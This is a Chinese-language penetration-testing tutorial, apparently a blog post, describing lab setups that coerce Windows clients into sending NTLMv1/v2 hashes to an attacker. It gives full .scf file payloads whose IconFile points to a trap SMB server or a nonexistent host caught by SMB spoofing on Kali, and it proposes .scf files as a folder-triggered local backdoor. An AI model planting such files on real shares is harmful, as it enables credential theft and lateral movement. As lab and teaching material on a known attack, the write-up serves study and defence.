# 0x00 前言
本文基于w师傅的《利用图标文件获取连接文件服务器的NTLMv2 Hash》一文（链接：[https://xz.aliyun.com/t/1977](https://xz.aliyun.com/t/1977)），对其进行了更详细的分类和总结。在我之前的文章《监听445端口抓v2数据》中，提到了一个关键问题：对于已经认证成功的用户再次访问时，将不会进行二次认证，因此我们无法通过常规手段获取其NTLM v1/v2哈希值。针对这一情况，我们需要采取其他方法来获取这些用户的哈希信息。

# 0x01 简介
接下来的内容将详细介绍以下几种方法：
- 通过添加scf文件强制用户访问伪造的文件服务器。
- 通过修改文件夹图标强制用户访问伪造的文件服务器。

读者可以根据自己的具体情况选择适合的攻击方式。

# 0x02 scf文件简介
scf文件即"Windows资源管理器命令"文件，是一种可执行文件，其中包含一个lconFile属性，可以填写UNC路径。利用这一点，我们可以实现对目标用户的重定向攻击。原作者在其文章中详细解释了该原理，即当文档管理器访问时会触发.scf文件的执行。

由于原作者仅测试了我思路中的部分方案，因此在此基础上，我将提供一个更加全面的方法。

# 0x03 使用scf文件强制用户访问伪造的文件服务器
### 测试环境
- **已控制的“文件”服务器IP**：192.168.20.3 (Windows Server 2008)
- **陷阱服务器IP**：192.168.20.141 (Windows 7)，使用Wireshark作为数据查看工具
- **客户端IP**：192.168.20.2 (Windows 2012)，已能够直接登录“文件”服务器

### 实验目的
通过让客户端访问“文件”服务器，从而强制其访问陷阱机器以获取NTLM v1/v2认证数据。

### 实验步骤
1. 在“文件”服务器(192.168.20.3)上创建并放置test.scf文件，内容如下：
   ```
   [Shell]
   Command=2
   IconFile=\\192.168.20.141\SYS\test.ico
   [Taskbar]
   Command=ToggleDesktop
   ```

2. 将上述文件置于共享目录内，并确保客户端能够访问到它。
3. 在陷阱服务器上启动Wireshark开始监听相关流量。
4. 让客户端(192.168.20.2)尝试访问“文件”服务器上的共享文件夹。
5. 此时，在陷阱服务器上应该可以看到来自客户端的请求认证信息，从而成功获取其NTLM v1/v2哈希值。

# 0x04 利用scf文件强制访问未知目标
如果考虑使用SMB欺骗技术，则可以通过设置不存在的目标地址使客户端广播请求，进而被我们捕获。

### 测试环境
- **欺骗机器IP**：192.168.20.131 (Kali Linux)
- **已控”文件”服务器IP**：同上
- **客户端IP**：同上

### 实验目的
通过让客户端访问“文件”服务器，从而强制其访问不存在的目标地址，最终通过广播机制被我们捕捉到其NTLM v1/v2哈希值。

### 实验步骤
1. 修改test.scf文件内容为指向一个不存在的目标地址：
   ```
   [Shell]
   Command=2
   IconFile=\\asdasdasd\SYS\test.ico
   [Taskbar]
   Command=ToggleDesktop
   ```

2. 在Kali Linux上开启SMB监听服务。
3. 客户端尝试访问“文件”服务器。
4. 观察Kali Linux上的日志记录，确认是否成功获取到目标用户的认证信息。

# 0x05 使用scf文件作为本机后门
此外，还可以探索将scf文件配置成本地后门的可能性，以便在用户打开特定文件夹时触发。

### 测试环境
- **欺骗机器IP**：同上
- **客户端IP**：同上
- **陷阱服务器IP**：同上

### 实验目的
验证scf文件能否作为本地后门使用，当用户打开指定文件夹时是否能够触发相应行为。

### 实验步骤
#### SMB欺骗测试
1. 在客户端C盘根目录下创建T文件夹并设为共享。
2. 向T文件夹中添加修改后的test.scf文件，指向不存在的目标地址。
3. 开启Kali Linux上的SMB欺骗服务。
4. 用户尝试访问T文件夹，观察Kali Linux是否能接收到认证请求。

#### 固定IP测试
1. 同样在客户端C盘根目录下创建Q文件夹。
2. 向Q文件夹中添加新的test_2.scf文件，这次指向真实的陷阱服务器地址。
3. 在陷阱服务器上启用Wireshark监听功能。
4. 用户访问Q文件夹，检查陷阱服务器上是否有相应的认证记录出现。